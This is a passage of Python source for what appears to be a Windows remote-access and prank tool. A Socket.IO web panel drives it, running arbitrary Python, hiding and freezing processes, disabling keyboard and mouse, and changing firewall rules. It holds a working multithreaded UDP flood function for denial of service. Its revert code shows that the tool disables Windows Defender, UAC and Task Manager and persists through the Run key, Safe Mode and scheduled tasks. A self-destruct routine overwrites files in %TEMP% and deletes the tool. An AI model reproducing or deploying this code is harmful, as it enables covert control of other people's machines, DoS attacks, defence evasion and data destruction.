            time_greeting = random.choice(greetings["afternoon"])
        else:
            time_greeting = random.choice(greetings["evening"])

        # Select weather message
        if "rain" in weather or "shower" in weather:
            weather_msg = random.choice(weather_messages["rain"])
        elif "thunder" in weather or "storm" in weather:
            weather_msg = random.choice(weather_messages["storm"])
        elif "snow" in weather:
            weather_msg = random.choice(weather_messages["snow"])
        elif "clear" in weather:
            weather_msg = random.choice(weather_messages["clear"])
        else:
            weather_msg = random.choice(weather_messages["cloudy"])

        # Temperature-based comments
        temp_msg = ""
        if temp > 30:
            temp_msg = random.choice([
            "Stay cool and hydrated!",
            "It's a scorcher!",
            "Perfect for ice cream!"
            ])
        elif temp < 5:
            temp_msg = random.choice([
            "Brr, it's chilly!",
            "Time to bundle up!",
            "Keep warm today!"
            ])

        # Combine messages
        welcome = f"{time_greeting}<br>{weather_msg}"
        if temp_msg:
            welcome += f"<br>{temp_msg}"
            
        return welcome
    
    @socketio.on_error_default
    def default_error_handler(e):
        print(f'SocketIO error: {str(e)}')

    @socketio.on('connect_error')
    def handle_connect_error(error):
        print(f'Connection error: {error}')

    @socketio.on('connect_failed')
    def handle_connect_failed():
        print('Connection to server failed')

    # Modify the existing connect handler to be more resilient
    @socketio.on('connect')
    def handle_connect():
        """Handle new socket connections with better error handling"""
        try:
            client_id = request.remote_addr
            session_id = session.get('session_id')
            
            # More permissive connection handling
            if not session.get('authenticated'):
                print(f"Unauthenticated connection attempt from {client_id}")
                socketio.emit('force_reload', {'reason': 'Unauthorized'}, room=request.sid) # does nothing...
                safe_disconnect()
                return False
            
            # Store socket session
            socket_sessions[request.sid] = {
                'client_id': client_id,
                'session_id': session_id,
                'connected_at': time.time()
            }
            
            if session_id in active_sessions:
                active_sessions[session_id]['socket_id'] = request.sid
            
            clients[client_id] = request.sid
            emit('connection_established', {'status': 'connected'})
            
            # Send session status
            remaining_time = 0
            if session_id in active_sessions:
                remaining_time = 3600 - (time.time() - active_sessions[session_id]['validated_at'])
            
            emit('session_status', {
                'valid': is_session_valid(),
                'remaining_time': int(remaining_time)
            })
            
            return True
            
        except Exception as e:
            print(f"Connection error: {e}")
            return False
    
    
    
    
    
    def send_alert(target_client_id, message):
        """
        Send an alert to a specific client
        
        Args:
            target_client_id: The client ID (IP address) to send the alert to
            message: The alert message to display
        """
        try:
            if target_client_id in clients:
                socketio.emit(
                    'show_alert', 
                    {'message': message}, 
                    room=clients[target_client_id],
                    namespace='/'
                )
                return True
            else:
                print(f"Client {target_client_id} not found in active clients")
                return False
        except Exception as e:
            print(f"Error sending alert to client {target_client_id}: {e}")
            return False

    def get_client_value(client_id, element_id, timeout=5):
        """
        Get a value from a client's UI element with improved reliability
        
        Args:
            client_id: The client ID (IP address)
            element_id: The ID of the HTML element to get the value from
            timeout: Maximum time to wait for response in seconds
        
        Returns:
            The value from the client or None if timeout/error occurs
        """
        request_id = f"{client_id}_{element_id}_{time.time()}"
        
        # Create a response queue for this request
        value_responses[request_id] = Queue()
        
        try:
            if client_id in clients:
                # Send the value request to the client
                socketio.emit(
                    'get_value',
                    {
                        'request_id': request_id,
                        'element_id': element_id
                    },
                    room=clients[client_id]
                )
                
                # Wait for response with timeout
                try:
                    response = value_responses[request_id].get(timeout=timeout)
                    del value_responses[request_id]
                    return response
                except Queue.Empty:
                    print(f"Timeout waiting for value from client {client_id}")
                    send_alert(client_id, "Request timed out. Please try again.")
                    return None
                    
            else:
                print(f"Client {client_id} not connected")
                return None
                
        except Exception as e:
            print(f"Error getting value from client {client_id}: {e}")
            return None
        finally:
            if request_id in value_responses:
                del value_responses[request_id]

    @socketio.on('value_response')
    def handle_value_response(data):
        """Handle value responses from clients"""
        request_id = data.get('request_id')
        value = data.get('value')
        
        if request_id in value_responses:
            value_responses[request_id].put(value)


    

    def handle_button_click(button_name, client_id):
        """Enhanced button click handler with reliable value retrieval"""
        # now it's threaded causae it fuckign crashes the program if it's done badly
        
        def thread_torun(button_name, client_id):
            if button_name == "play_last_recording":
                    try:
                        audio_handler = AudioHandler()
                        recordings = os.listdir(audio_handler.WAVE_OUTPUT_FOLDER)
                        if recordings:
                            # Get most recent recording for this client
                            client_recordings = [r for r in recordings if client_id.replace('.', '_') in r]
                            if client_recordings:
                                latest_recording = max(client_recordings, key=lambda x: os.path.getctime(
                                    os.path.join(audio_handler.WAVE_OUTPUT_FOLDER, x)))
                                audio_handler.play_audio(os.path.join(audio_handler.WAVE_OUTPUT_FOLDER, latest_recording))
                                send_alert(client_id, "Playing last recording")
                            else:
                                send_alert(client_id, "No recordings found for this client")
                        else:
                            send_alert(client_id, "No recordings found")
                    except Exception as e:
                        print(f"Error playing last recording: {e}")
                        send_alert(client_id, "Error playing recording")
            else:
                try:
                    if button_name.endswith('_buttonnotextfield'):
                        button_name = button_name.split('_')[0]
                        run_task(button_name, client_id=client_id)
                        send_alert(client_id, f"Action '{button_name}' executed successfully")
                    else:
                        element_id = button_name.replace('_button', '_textfield')
                        button_name = button_name.split('_')[0]
                        
                        if function_needs_text(button_name):
                            value = get_client_value(client_id, element_id)
                            if value is not None:
                                run_task(button_name, value, client_id=client_id)
                                send_alert(client_id, f"Action '{button_name}' executed successfully")
                            else:
                                send_alert(client_id, "Failed to get input value. Please try again.")
                        else:
                            run_task(button_name, client_id=client_id)
                            send_alert(client_id, f"Action '{button_name}' executed successfully")
                            
                except Exception as e:
                    error_msg = f"Error processing button click: {str(e)}"
                    print(error_msg)
                    send_alert(client_id, error_msg)
        asr= threading.Thread(target=thread_torun, args=(button_name, client_id,))
        asr.start()

    def function_needs_text(function_name):
        """Checks if a function requires text input."""
        text_required_functions = [
            'open website', 'text to speech', 'speak in a language', 'play frequency', 'play shepard tone',
            'send to background highlight', 'make the screen rotate', 'press keys', 'type a string like a human', 
            'playytvidbetweentime', 'kill process', 'set volume', 'update script', 'rename script', 'hide process', 
            'show process', 'move script to folder', 'dos ip:port', 'run python code', 
            'unblock application by name', 'block application by name', 'unblock ports for application', 
            'block ports for application', 'send task to all hosts', 'request screen share',
            'run function via string', 'set dvd timeout', 'always on top', 'unset always on top', 'presskeys',
            'writetext', 'turn the screen black', 'maximize process', 'minimize process', 'hiccups', 'set screen brightness'
        ]
        return function_name.lower() in text_required_functions

    def run_task(task, text=None, client_id=None):
        print(f"Running task: {task}, with text of {text} and client_id of {client_id}")
        global autoterminateunknownexeprocesses
        """Executes a task based on the button clicked in the web UI."""
        task = task.lower()
        if task == 'open website':
            print("Opening website:", text)
            webhandler(text)
        elif task == 'text to speech':
            print("Converting text to speech:", text)
            texttospeech(text)
        elif task == 'stop_soundboard_sounds':
            soundboard_manager.stop_all_sounds()
        elif task == 'speak in a language':
            print("Speaking in specified language:", text)
            speakXlanguage(text)
        elif task == 'play frequency':
            frequency, duration = text.split(':')
            print(f"Playing frequency: {frequency} Duration: {duration}")
            play_tone(int(frequency), int(duration))
        elif task == 'play shepard tone':
            start_freq, end_freq, duration = text.split(':')
            print(f"Playing Shepard tone from {start_freq} to {end_freq} Duration: {duration}")
            play_shepard_tone(int(start_freq), int(end_freq), int(duration))
        elif task == 'restart explorer':
            print("Restarting Explorer")
            restart_explorer()
        elif task == 'download and install chrome':
            print("Downloading and installing Chrome")
            installchrome()
        elif task == 'send to background highlight':
            print("Sending to background and highlighting:", text)
            inviscurr(text)
        elif task == 'turn the screen black':
            print(f"Turning the screen black for {text} seconds")
            blackenscreen(text)
        elif task == 'make the screen rotate':
            print(f"Rotating the screen for {text} seconds")
            makethescreendorotations(text)
        elif task == 'flip screen: upsidedown':
            print("Flipping the screen upside down")
            flipscreen()
        elif task == 'flip screen: right':
            print("Flipping the screen to the right")
            screenportraitflipped()
        elif task == 'flip screen: normal':
            print("Flipping the screen to the normal position")
            screenlandscape()
        elif task == 'flip screen: left':
            print("Flipping the screen to the left")
            screenportrait()
        elif task.startswith('payload'):
            payload_num = task.split('payload')[1]
            print(f"Executing payload {payload_num}")
            runfunctionvianame(f'payload_{payload_num}')
            # globals()[f"payload_{payload_num}"]()
        elif task == 'per click, lag windows (enable)':
            print("Enabling per click lag for windows")
            enable_windows_lag_click_sound()
        elif task == 'per click, lag windows (disable)':
            print("Disabling per click lag for windows")
            disable_windows_lag_click_sound()
        elif task == 'swap rmb and lmb':
            print("Swapping right and left mouse buttons")
            swapRMBAndLMB(True)
        elif task == 'unswap rmb and lmb':
            print("Unswapping right and left mouse buttons")
            swapRMBAndLMB(False)
        elif task == 'enablekeyboard':
            print("Enabling keyboard")
            enable_keyboard()
        elif task == 'disablekeyboard':
            print("Disabling keyboard")
            disable_keyboard()
        elif task == 'enablemouse':
            print("Enabling mouse")
            enable_mouse()
        elif task == 'disablemouse':
            print("Disabling mouse")
            disable_mouse()
        elif task == 'me and the boys!':
            print("It's me and the boys time!")
            MeAndTheBoys()
        elif task == 'presskeys':
            print("Pressing keys:", text)
            presskeys(text)
        elif task == 'writetext':
            print("Typing text:", text)
            writetext(text)
        elif task == 'type a string like a human':
            print("Typing a string like a human:", text)
            type_string_with_human_delay(text)
        elif task == "disable subtly mess with windows":  
            disable_subtly_mess_with_windows()
        elif task == "enable subtly mess with windows":
            enable_subtly_mess_with_windows()
        elif task == "create phantom notification":
            create_phantom_notification()
        elif task == "disable subtle mouse actions":
            disable_subtly_mess_with_mouse()
        elif task == "enable subtle mouse actions":
            enable_subtly_mess_with_mouse()
        elif task == "disable subtly mess with text":
            disable_subtly_mess_with_text()
        elif task == "enable subtly mess with text":
            enable_subtly_mess_with_text()
        elif task == "hiccups":
            hiccups(int(text))
        elif task == "set screen brightness":
            set_screen_brightness(int(text))
        elif task == "enable internet fl":
            enable_internet_fl()
        elif task == "disable internet fl":
            disable_internet_fl()
        elif task == "panic subtle functions disable":
            panic_subtle_functions_disable()
        elif task == "enable subtle functions":
            enable_subtle_functions()
        elif task == "check vary running":
            check_vary_running()
        elif task == 'kill process':
            print("Killing process:", text)
            procKill(text)
        elif task == 'set volume':
            print("Setting volume to:", text)
            set_volume(text) 
        elif task == 'hide process':
            send_alert(client_id, "Hiding process..")
            print("Hiding process:", text)
            hide_process_via_name(text)
        elif task == 'show process':
            send_alert(client_id, "Revealing process..")
            print("Showing process:", text)
            show_process_via_name(text)
        elif task == 'freeze all processes':
            print("Freezing all processes")
            freeze_all_processes()
        elif task == 'unfreeze all processes':
            print("Unfreezing all processes")
            unfreeze_all_processes()
        elif task == 'maximize process':
            print("Maximizing process:", text)
            maximize_process_via_name(text)
        elif task == 'minimize process':
            print("Minimizing process:", text)
            minimize_process_via_name(text)
        elif task == 'always on top':
            print(f'Setting process: "{text}" to always on top')
            set_always_on_top_via_name(text)
        elif task == 'unset always on top':
            print(f'Unsetting process: "{text}" to always on top')
            unset_always_on_top_by_name(text)

        elif task == 'disable automatic process termination':
            print("Disabling automatic process termination")
            autoterminateunknownexeprocesses = False
        elif task == 'enable automatic process termination':
            print("Enabling automatic process termination")
            autoterminateunknownexeprocesses = True
        elif task == 'set dvd timeout':
            print("Setting DVD timeout to:", text)
            dvdtimeout(int(text))
        elif task == 'Play YouTube Video (Fullscreen)'.lower():
            print("Playing YouTube video between time fullscreen:", text)
            if ":" in text:
                url, start, end = text.split(":")
                if not start or start == "":
                    start = None
                if not end or end == "":
                    end = None
            else:
                url, start, end = text, None, None
            playYTvidfullscreen(url, start, end)
        elif task == 'Play YouTube Video (Background)'.lower():
            print("Playing YouTube video between time background:", text)
            if ":" in text:
                url, start, end = text.split(":")
                if not start or start == "":
                    start = None
                if not end or end == "":
                    end = None
            else:
                url, start, end = text, None, None
            playYTvidinbackground(url, start, end)
        elif task == "run python code":
            print("Running Python code:", text)
            trn = runpythonscript(text)
            send_alert(target_client_id=client_id, message=trn)
        elif task == "unblock application by name":
            unblock_application_by_name(text)  # Assuming this function exists and is defined elsewhere in your code
        elif task == "block application by name":
            block_application_by_name(text)
        elif task == "unblock ports for application":
            unblock_ports_for_application(text)  # Assuming this function exists and is defined elsewhere in your code
        elif task == "block ports for application":
            block_ports_for_application(text)  # Assuming this function exists and is defined elsewhere in your code
        elif task == "stop dos attacks":
            closedosingthreads()  # Assuming this function exists and is defined elsewhere in your code
        elif task == "cleareffect":
            clear_effect()
        elif task == "rain":
            set_effect("rain")
        elif task == "lightning":
            set_effect("lightning")
        elif task == "matrix":
            set_effect("matrix")
        elif task == "particles":
            set_effect("particles")
        elif task == "binary":
            set_effect("binary")
        elif task == "vortex":
            set_effect("vortex")
        elif task == "cosmic":
            set_effect("cosmic")
        elif task == "psychedelic":
            set_effect("psychedelic")
        elif task == "quantumparticles":
            set_effect("quantum_particles")
        elif task == "voidportals":
            set_effect("void_portals")
        elif task == "realityfractures":
            set_effect("reality_fractures")
        elif task == "timeripples":
            set_effect("time_ripples")
        elif task == "dnahelix":
            set_effect("dna_helix")
        elif task == "dimensionaltears":
            set_effect("dimensional_tears")
        elif task == "energy":
            set_effect("energy")
        else:
            print("Task not found:", task)
            send_alert(client_id, "Task not found. Notify dev if this is unexpected")
            slp(3)

    def requestValue(element_id, client_id):
        """Requests a value from the web UI."""
        socketio.emit('get_value', {'element_id': element_id, 'client_id': client_id})
        global last_response_from_clientUI, newresponse
        newresponse = ''
        timeout = time.time() + 4
        while newresponse == '':
            if time.time() > timeout:
                print('Timeout reached. No response received for: ' + element_id)
                return ''
        return newresponse
    
    # certfile = 'server.pem'
    # keyfile = 'server.key'
    1
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")

    certfile = os.path.join(base_path, 'server.pem')
    keyfile = os.path.join(base_path, 'server.key')
    socketio.run(app, host=socket.gethostbyname(socket.gethostname()), port=10102, certfile=certfile, keyfile=keyfile)      
    print(f'Running server on {socket.gethostname(socket.gethostname())}:10102')
 
def mainuirun():
    """Starts the main UI loop."""
    while True:
        try:
            websiteUI()
        except Exception as e:
            print(f'Error in websiteUI: {e} \nRetrying in 3 seconds')
            slp(3)


def onStartup():
    """Handles startup routines, including network scanning and connection establishment."""
    global server
    print("onStartup")
    thread_handle_serverhost = threading.Thread(target=serverhost)
    thread_handle_serverhost.start()
   
    def scan_forvary():
        """Scans the network for other Diversify hosts."""
        varyhosts.clear()
        [varyhosts.append(i) for i in search_for_local_devices_port(vary_PORT)]
    scan_forvary()
    for i in varyhosts:
        if ":" in i:
            tlp, port = i.split(':')
        send(f'{tlp}:{port}', "SystemStartupIAmAVaryHost") 
        
def wait_on_receive(host, port):
    """Waits for a message to be received from a specific host and port."""
    global device_item_received
    if (host, int(port)) not in device_item_received:
        device_item_received[(host, int(port))] = ''
    current_item = device_item_received[(host, int(port))]
    while device_item_received[(host, int(port))] == current_item:
        pass
    return device_item_received[(host, int(port))]

def remote_share(host):
    """Initiates a remote screen sharing session."""
    port = vary_PORT
    send(f'{host}:{port}', "RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))")
    okay_to_continue = wait_on_receive(host, port)
    if okay_to_continue.lower() == 'true':
        print('host/user accepted screen share')
        client_ss(host)
        print('SS finished, moving on')
    else:
        print('host/user rejected screen share')

def check_if_mouse_moved(delta=3):
    """Checks if the mouse has moved by a certain delta."""
    x1, y1 = pyautogui.position()
    while True:
        time.sleep(0.1)
        x2, y2 = pyautogui.position()
        dx = abs(x1 - x2)
        dy = abs(y1 - y2)
        dt = math.sqrt(dx**2 + dy**2)
        if dt > delta:
            return True
        
def check_if_keyboard_pressed():
    """Checks if any keyboard key has been pressed."""
    def on_press(key):
        """Callback function for keyboard listener."""
        return False  # Stop the listener
    with pynput_keyboard.Listener(on_press=on_press) as listener:
        listener.join() 
    return True 

def update_last_keyboard_input_time():
    """Updates the timestamp of the last keyboard input."""
    global last_keyboard_input_time
    check_if_keyboard_pressed()
    last_keyboard_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_keyboard_input():
    """Calculates the time since the last keyboard input."""
    global keyboard_idle, last_keyboard_input_time
    threading.Timer(0, update_last_keyboard_input_time).start()
    keyboard_idle = time.time() - last_keyboard_input_time

def start_timer_keyboardcheck():
    """Starts the timer for checking keyboard idle time."""
    threading.Timer(1.0, start_timer_keyboardcheck).start()
    timer_how_long_since_last_keyboard_input()

if __name__ == '__main__':
    threading.Timer(1.0, start_timer_keyboardcheck).start()

def update_last_mouse_input_time():
    """Updates the timestamp of the last mouse input."""
    global last_mouse_input_time
    check_if_mouse_moved()
    last_mouse_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_mouse_input():
    """Calculates the time since the last mouse input."""
    global mouse_idle, last_mouse_input_time
    threading.Timer(0, update_last_mouse_input_time).start()
    mouse_idle = time.time() - last_mouse_input_time

def start_timer_mousecheck():
    """Starts the timer for checking mouse idle time."""
    threading.Timer(1.0, start_timer_mousecheck).start()
    timer_how_long_since_last_mouse_input()

if __name__ == '__main__':
    threading.Timer(1.0, start_timer_mousecheck).start()

def startdvdanim():
    """Starts a DVD screensaver animation."""
    global timeoutfordvd
    print('Starting DVD animation handler...')

    def killablethreadtouse_dvd():
        """Runs the DVD animation in a killable thread."""
        pygame.quit()
        pygame.init()
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        original_image = pygame.image.load(img_bytes)
        screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.NOFRAME)
        pygame.mouse.set_visible(False)
        hwnd = pygame.display.get_wm_info()["window"]
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        scale = 0.2
        speed = 1.2
        dvd_width = int(original_image.get_width() * scale)
        dvd_height = int(original_image.get_height() * scale)
        dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
        dvd_x = random.randint(0, screen_width - dvd_width)
        dvd_y = random.randint(0, screen_height - dvd_height)
        dx = speed
        dy = speed
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
            dvd_x += dx
            dvd_y += dy
            if dvd_x < 0 or dvd_x + dvd_width > screen_width:
                dx *= -1
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)
                dvd_image = pygame.transform.flip(dvd_image, True, False)
                print("Hit horizontal edge!")
            if dvd_y < 0 or dvd_y + dvd_height > screen_height:
                dy *= -1
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)
                dvd_image = pygame.transform.flip(dvd_image, False, True)
                print("Hit vertical edge!")
            screen.fill((0, 0, 0))
            screen.blit(dvd_image, (dvd_x, dvd_y))
            pygame.display.flip()
        pygame.quit()

    global killablethread_thread
    killablethread_thread = KThread(target=killablethreadtouse_dvd)
    while True:
        try:
            slp(1)
            if keyboard_idle > timeoutfordvd and mouse_idle > timeoutfordvd:
                print('System is idle!')
                if not killablethread_thread.is_alive():
                    killablethread_thread.start()
                    print("Started DVD thread")
                slp(1)
            else:
                # print('System is not idle')
                if killablethread_thread.is_alive():
                    killablethread_thread.kill()
                    killablethread_thread.join()
                    print("Killed DVD thread")
                    killablethread_thread = KThread(target=killablethreadtouse_dvd)
        except Exception as e:
            print(e)    

dvd_runthread = KThread(target=startdvdanim) # Needs to be here due to definition errors

def dvdtimeout(howlongofatimetocheck):
    """Sets the timeout for the DVD animation."""
    global timeoutfordvd, dvd_runthread, killablethread_thread
    print("setting timeout to: " + str(howlongofatimetocheck))
    timeoutfordvd = howlongofatimetocheck
    if howlongofatimetocheck == 0:
        print('Killing DVD thread')
        try: killablethread_thread.kill()
        except: pass
        try: dvd_runthread.kill()
        except: pass
        dvd_runthread = KThread(target=startdvdanim)
        return
    if not dvd_runthread.is_alive():
        print("Starting DVD thread")
        dvd_runthread.start()


def dosIPPORT(ipPORT):
    """Performs a DoS attack on a given IP address and port."""
    addr = ipPORT.split(':')
    print(f"DOS-ing {addr[0]}:{addr[1]}...")   
    ip = addr[0]
    port = int(addr[1])
    threads_count_to = int(12)
    
    def tosend():
        """Sends UDP packets to the target."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 0))
        while True:
            sock.sendto(b'A!@#' * 1024 * 4, (ip, port))
            
    global DosingThreads
    for i in range(threads_count_to):
        t = KThread(target=tosend)
        DosingThreads.append(t)
        t.start()
        
def closedosingthreads():
    """Stops all DoS attack threads."""
    global DosingThreads
    print(f"Stopping {len(DosingThreads)} DoS threads...")
    while DosingThreads:
        thread = DosingThreads.pop()
        thread.kill()
    print("All DoS threads stopped.")

def name_port_check(name):
    """Returns a list of ports used by a process."""
    pids = get_pids_for_process_name(name)
    ports = [conn.laddr.port for pid in pids for conn in psutil.Process(pid).connections() if conn.laddr]
    ports = list(dict.fromkeys(ports))
    print(f'ports for {name}: {ports} ')
    return ports if ports else None

def reset_firewall():
    """Resets the Windows Firewall to its default settings."""
    run_command_as_admin('netsh advfirewall reset')

def block_application_by_name(application_name):
    """Blocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        run_command_as_admin(f'netsh advfirewall firewall add rule name=BlockApplication dir=in action=block program="{application_path}"')
        run_command_as_admin(f'netsh advfirewall firewall add rule name=BlockApplication dir=out action=block program="{application_path}"')
        print(f"Blocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def unblock_application_by_name(application_name):
    """Unblocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        run_command_as_admin(f'netsh advfirewall firewall delete rule name=BlockApplication program="{application_path}"')
        print(f"Unblocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def block_ports_for_application(application_name):
    """Blocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            run_command_as_admin(f'netsh advfirewall firewall add rule name="BlockPort {str(port)}" dir=in action=block protocol=TCP localport={port}')
            print(f"Blocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def unblock_ports_for_application(application_name):
    """Unblocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            run_command_as_admin(f'netsh advfirewall firewall delete rule name="BlockPort {str(port)}"')
            print(f"Unblocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def who_is_using_port(port): 
    """Returns the PID, path, and name of the process using a specific port."""
    for proc in psutil.process_iter(['pid', 'connections']):
        for conn in proc.info['connections']:
            if conn.raddr and conn.raddr.ip != '127.0.0.1' and int(conn.laddr.port) == int(port):
                return proc.pid, proc.exe().lower().replace('\\', '/').casefold(), proc.name()
    return None

def revert_changes():
    """Reverts the changes made by the script."""
    unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    EnableWindowsDefender()
    enableresetoptions()
    enabletaskmgr()
    enableUserAccountControl()
    enablefirewall()
    remove_self_from_startup()
    remove_self_from_safe_mode()
    try:
        delete_matching_tasks()
    except:
        pass 

def remove_self_from_startup():
    """Removes the script from startup."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    script_filename = get_script_filename()
    startup_path = os.path.join(startup_folder, script_filename)
    try:
        os.remove(startup_path)
        print("Removed from startup folder:", startup_path)
    except FileNotFoundError:
        print("Script not found in startup folder:", startup_path)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, 'vtl') 
        winreg.CloseKey(key)
        print("Removed from registry.")
    except FileNotFoundError:
        print("Script not found in registry.")

def remove_self_from_safe_mode():
    """Removes the script from Safe Mode."""
    registry_paths = [
        r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
    ]
    for path in registry_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "robocopy.exe")
            winreg.CloseKey(key)
            print(f"Removed from safe mode registry: {path}")
        except FileNotFoundError:
            print(f"Script not found in safe mode registry: {path}")

def unprotect_file(file_path):
    """Removes protection from a file."""
    run_command_as_admin(f'attrib -r -h -s "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /grant everyone:RX')
    run_command_as_admin(f'takeown /f "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /grant Everyone:(OI)(CI)F ')
    # Re-enable inheritance and remove specific permissions
    run_command_as_admin(f'icacls "{file_path}" /inheritance:e')
    # Remove read-only, hidden, and system attributes
    run_command_as_admin(f'attrib -r -h -s "{file_path}"')
    # Reset permissions to default (you may need to adjust this based on your system's defaults)
    run_command_as_admin(f'icacls "{file_path}" /reset')    
    # Enable inheritance and grant full control to the current user
    run_command_as_admin(f'icacls "{file_path}" /inheritance:e /grant:r {os.environ["username"]}:F')

def remove_from_startup():
    try:
        shortcut_path = os.path.join(STARTUP_FOLDER, get_script_filename() + ".lnk")
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
    except Exception as e:
        print(f"Error removing from startup: {e}")


    try:
        task_name = 'v0' # Use a consistent task name
        run_command_as_admin(f'schtasks /delete /tn "{task_name}" /f')  # Delete the scheduled task if it exists
    except Exception as e:
        print(f"Error removing scheduled task: {e}")

def delete_matching_tasks():
    """Deletes scheduled tasks that run the script."""
    """Modified to remove specific task, v0"""
    remove_from_startup()
    # script_path = os.path.join(get_script_directory(), get_script_filename())
    # result = subprocess.run(['schtasks', '/query', '/xml'], capture_output=True, text=True)
    # tasks_xml = result.stdout
    # tasks = tasks_xml.split('<?xml version="1.0" ?>')    
    # for task_xml in tasks:
    #     if not task_xml.strip():
    #         continue
    #     task_xml = '<?xml version="1.0" ?>' + task_xml.strip()
    #     try:
    #         root = ET.fromstring(task_xml)
    #         actions = root.find('.//Actions')
    #         if actions is not None:
    #             for exec_action in actions.findall('.//Exec'):
    #                 command = exec_action.find('Command')
    #                 if command is not None and command.text == script_path:
    #                     task_name = root.find('.//RegistrationInfo/URI').text
    #                     if task_name:
    #                         delete_command = f'schtasks /delete /tn "{task_name}" /f'
    #                         subprocess.run(delete_command, shell=True)
    #                         print(f"Deleted task: {task_name}")
        # except ET.ParseError as e:
            # print(f"Failed to parse task XML: {e}")
 

def secure_delete_file(file_path, passes=3):
    """Securely delete a single file by overwriting it with random data."""
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'r+b') as file:
            for _ in range(passes):
                file.seek(0)
                file.write(os.urandom(file_size))
                file.flush()
        os.remove(file_path)
    except Exception as e:
        pass
        # print(f"Error deleting file {file_path}: {e}")
def secure_delete_directory(directory_path, passes=3):
    """
    Deletes directories and files within a given directory, 
    with a focus on those starting with '_' for potential 
    pyinstaller packaged application cleanup, without using shutil.
    """

    def deletion(root, dirs, files):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                secure_delete_file(file_path, passes) 
            except Exception:
                pass

        # Delete directories in reverse order to handle nested directories
        for dir in reversed(dirs):
            dir_path = os.path.join(root, dir)
            if dir.startswith("_"):
                try:
                    delete_directory_recursively(dir_path)
                except Exception:
                    pass
            else:
                try:
                    os.rmdir(dir_path) 
                except OSError:
                    pass

    def delete_directory_recursively(dir_path):
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    secure_delete_file(file_path, passes)
                except Exception:
                    pass
            for dir in dirs:
                dir_path_inner = os.path.join(root, dir)
                try:
                    os.rmdir(dir_path_inner)
                except Exception:
                    pass
        try:
            os.rmdir(dir_path)
        except Exception:
            pass

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory_path):
            executor.submit(deletion, root, dirs, files)

def take_ownership(path):
    """Take ownership of the specified file or directory."""
    try:
        # Use the takeown command to take ownership of the directory or file
        run_command_as_admin(f'takeown /f "{path}"')
        run_command_as_admin(f'icacls "{path}" /grant {os.getlogin()}:F /t')
    except Exception as e:
        # print(f"Error taking ownership of {path}: {e}")
        pass
def self_destruct():
    """Deletes the script file and reverts all changes."""
    revert_changes()
    try:
        # take ownership of the temp dir
        take_ownership(os.path.expandvars(r'%TEMP%').casefold())
        print("Finished taking ownership of given space")
    except: pass
    try:
        secure_delete_directory(os.path.expandvars(r'%TEMP%').casefold())
        print("Deleting has finished..")    
    except: pass
    script_path = os.path.join(get_script_directory(), get_script_filename())
    random_string_cmd = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    random_task_name = "SelfDestruct_" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cmd_content = f"""
@echo off
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
schtasks /delete /tn "{random_task_name}" /f
ping 127.0.0.1 -n 2 > nul
del /f /q "%~f0"
    """
    cmd_path = os.path.join(get_script_directory(), random_string_cmd)
    with open(cmd_path, "w") as cmd_file:
        cmd_file.write(cmd_content)
    user_name = os.getlogin()
    create_task_command = f'schtasks /create /tn "{random_task_name}" /tr "{cmd_path}" /sc ONCE /st 00:00 /f /rl HIGHEST /ru {user_name}'
